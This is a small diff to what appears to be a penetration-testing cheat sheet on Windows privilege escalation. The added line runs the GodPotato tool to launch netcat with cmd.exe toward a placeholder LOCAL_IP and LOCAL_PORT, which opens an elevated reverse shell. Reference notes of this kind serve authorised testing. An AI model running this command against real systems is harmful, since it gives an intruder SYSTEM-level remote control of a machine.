@@ -11361,6 +11361,7 @@ else:
 
 ```c
 .\GodPotato-NET4.exe -cmd '<COMMAND>'
+GodPotato-NET4.exe -cmd "C:\windows\temp\nc.exe -t -e C:\Windows\System32\cmd.exe LOCAL_IP LOCAL_PORT"
 ```
 
 #### Juicy Potato LPE
